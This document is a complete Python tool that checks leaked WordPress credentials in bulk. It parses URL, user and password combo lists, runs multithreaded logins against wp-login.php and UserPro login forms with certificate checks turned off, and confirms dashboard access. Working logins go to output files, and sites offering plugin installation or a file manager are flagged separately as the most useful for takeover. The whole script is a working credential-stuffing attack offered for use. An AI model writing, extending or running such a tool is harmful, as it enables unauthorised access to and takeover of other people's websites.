import requests
import re
import time
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, init
from urllib.parse import urlparse

# Disable SSL warning messages for clean terminal output
requests.packages.urllib3.disable_warnings()

# Initialize colorama
init(autoreset=True)

g = Fore.GREEN     # Success
r = Fore.RED       # Errors
y = Fore.YELLOW    # Warnings
c = Fore.CYAN      # Info / Progress
m = Fore.MAGENTA   # Visual Accents
w = Fore.WHITE     # Base text

def clean_base_url(url):
    """Strips trailing slashes and ensures standard protocol handling."""
    url = url.strip()
    while url.endswith('/'):
        url = url[:-1]
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url

def get_url_without_path(url_str):
    """Extracts scheme + netloc to match the original script's URL_P logic."""
    try:
        parsed = urlparse(url_str)
        return f"{parsed.scheme}://{parsed.netloc}"
    except Exception:
        return url_str

def parse_entry(entry):
    """
    Parses entry string supporting multiple format definitions:
    1. URL|USER|PASS
    2. URL#USER@PASS or URL#USER:PASS
    3. URL:USER:PASS
    """
    cleaned = entry.strip().rstrip(':').strip()
    
    # Format A: Hash Format
    if "#" in cleaned:
        try:
            url_part, credentials = cleaned.split('#', 1)
            if "@" in credentials:
                user, passwd = credentials.split('@', 1)
                return url_part, user, passwd
            elif ":" in credentials:
                user, passwd = credentials.split(':', 1)
                return url_part, user, passwd
        except Exception:
            pass

    # Format B: Pipe Format
    if "|" in cleaned:
        parts = cleaned.split('|')
        if len(parts) == 3:
            return parts[0], parts[1], parts[2]
            
    # Format C: Colon Format
    match = re.match(r'^(.*):([^:]+):([^:]+)$', cleaned)
    if match:
        return match.group(1), match.group(2), match.group(3)
        
    return None

def check_wp_admin(entry, output_file):
    try:
        parsed = parse_entry(entry)
        if not parsed:
            print(f" {r}[FAIL] {w}Format Error | Invalid line layout -> {entry.strip()}")
            return

        raw_url, username, password = parsed
        url = clean_base_url(raw_url)

        print(f" {c}[INFO] {w}Checking: {url} {m}→ {w}User: {username}")

        reqFox = requests.Session()
        reqFox.verify = False
        
        headersLogin = {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9',
            'referer': f'{url}/wp-admin/'
        }

        loginPost_Fox = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': f'{url}/wp-admin/'}
        
        # --- PHASE 1: ATTEMPT INITIAL LOGIN ---
        try: 
            login_Fox = reqFox.post(f'{url}/wp-login.php', data=loginPost_Fox, headers=headersLogin, timeout=20, allow_redirects=True)
        except Exception: 
            print(f" {r}[DEAD] {w}Connection dropped / Timeout: {url}")
            return
            
        if login_Fox.status_code in {401, 403, 404, 410, 500, 502, 503, 504}:
            print(f" {r}[FAIL] {w}Portal inaccessible (HTTP {login_Fox.status_code}): {url}")
            return

        # --- PHASE 2: REDIRECT AND SUBFOLDER CORRECTION (URL_P logic) ---
        if get_url_without_path(login_Fox.url) != get_url_without_path(url):
            url = clean_base_url(get_url_without_path(login_Fox.url))
            reqFox = requests.Session()
            reqFox.verify = False
            loginPost_Fox = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': f'{url}/wp-admin/'}
            try: 
                login_Fox = reqFox.post(f'{url}/wp-login.php', data=loginPost_Fox, headers=headersLogin, timeout=20, allow_redirects=True)
            except Exception:
                print(f" {r}[DEAD] {w}Redirect handling failed for: {url}")
                return

        # --- PHASE 3: ADVANCED USERPRO PLUGIN BYPASS GATE ---
        login_html = login_Fox.text
        if 'profile/login' in login_html:
            try:
                id_wp = re.findall(re.compile('type="hidden" name="force_redirect_uri-(.*)" id='), login_html)[0]
                myuserpro = re.findall(re.compile('name="_myuserpro_nonce" value="(.*)" /><input type="hidden" name="_wp_http_referer"'), login_html)[0]
                
                loginPost_Fox = {
                    'template': 'login', 'unique_id': f'{id_wp}', 'up_username': '0', 'user_action': '',
                    '_myuserpro_nonce': myuserpro, '_wp_http_referer': '/profile/login/',
                    'action': 'userpro_process_form',
                    f'force_redirect_uri-{id_wp}': '0', 'group': 'default',
                    f'redirect_uri-{id_wp}': '', 'shortcode': '',
                    f'user_pass-{id_wp}': password, f'username_or_email-{id_wp}': username
                }
                login_Fox = reqFox.post(f'{url}/wp-admin/admin-ajax.php', data=loginPost_Fox, headers=headersLogin, timeout=20)
            except Exception:
                print(f" {r}[FAIL] {w}UserPro automation parsing failure on: {url}")
                return

        # --- PHASE 4: THE TARGET STRING CHECKS ---
        try: 
            check_response = reqFox.get(f'{url}/wp-admin/', headers=headersLogin, timeout=20, allow_redirects=True)
            check = check_response.text
        except Exception: 
            print(f" {r}[FAIL] {w}Dashboard extraction failed for: {url}")
            return

        if check_response.status_code in {401, 403, 404, 500, 502, 503}:
            print(f" {r}[FAIL] {w}Dashboard validation error (HTTP {check_response.status_code}) -> {entry.strip()}")
            return

        # STRICT CODE SCAN logic matching inside the HTML response body
        if 'wp-admin/profile.php' in check or 'wpwrap' in check:
            print(f" {g}[PASS] {w}VALID LOGGED PATH CONFIRMED → {g}{entry.strip()}")
            
            # Primary validation array capture
            with open(output_file, "a", encoding="utf-8") as valid_file:
                valid_file.write(f"{entry.strip()}\n")
            
            # Smart asset categorization logging
            if 'plugin-install.php' in check:
                with open('plugin-install.txt', 'a', encoding="utf-8") as pf:
                    pf.write(f"{entry.strip()}\n")
                print(f"  {g}└── [ASSET] Plugin Install Access Flagged!")
                
            if 'WP File Manager' in check:
                with open('filemanager.txt', 'a', encoding="utf-8") as ff:
                    ff.write(f"{entry.strip()}\n")
                print(f"  {g}└── [ASSET] WP File Manager Active Module Flagged!")
            return
        else:
            print(f" {r}[FAIL] {w}Target path string missing in layout source -> {entry.strip()}")

        time.sleep(random.uniform(0.1, 0.4))

    except Exception as e:
        print(f" {r}[ERRO] {w}Unexpected Logic Exception: {str(e)}")

def main():
    print(f"\n{m}==================================================================")
    print(f"{g}             WORDPRESS TARGET COMPLEX STRINGS LOGIC ENGINE        ")
    print(f"{m}==================================================================\n")
    
    try:
        file_path = input(f" {g}>> {w}Enter input file path: ").strip()
        output_file = input(f" {g}>> {w}Enter output file name (default: Successfully_logged_WordPress.txt): ").strip() or "Successfully_logged_WordPress.txt"
        
        try:
            threads = int(input(f" {g}>> {w}Enter parallel thread velocity (e.g., 20-50): ").strip())
        except ValueError:
            threads = 25

        with open(file_path, "r", encoding="utf-8") as file:
            lines = [line.strip() for line in file if line.strip()]

        print(f"\n {y}[INFO] {w}Loaded {len(lines)} elements. Compiling execution arrays...\n")
        print(f"{m}------------------------------------------------------------------")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(check_wp_admin, entry, output_file) for entry in lines]
            for future in as_completed(futures):
                pass

        print(f"{m}------------------------------------------------------------------")
        print(f"\n {g}[SUCCESS] {w}Verification phase complete.")
        print(f" {g}[SUCCESS] {w}Hits exported to '{output_file}', 'plugin-install.txt', and 'filemanager.txt'.\n")

    except FileNotFoundError:
        print(f"\n {r}[ERRO] {w}Input source file path could not be located.")
    except Exception as e:
        print(f"\n {r}[ERRO] {w}Core engine encountered critical exception: {str(e)}")

if __name__ == "__main__":
    main()
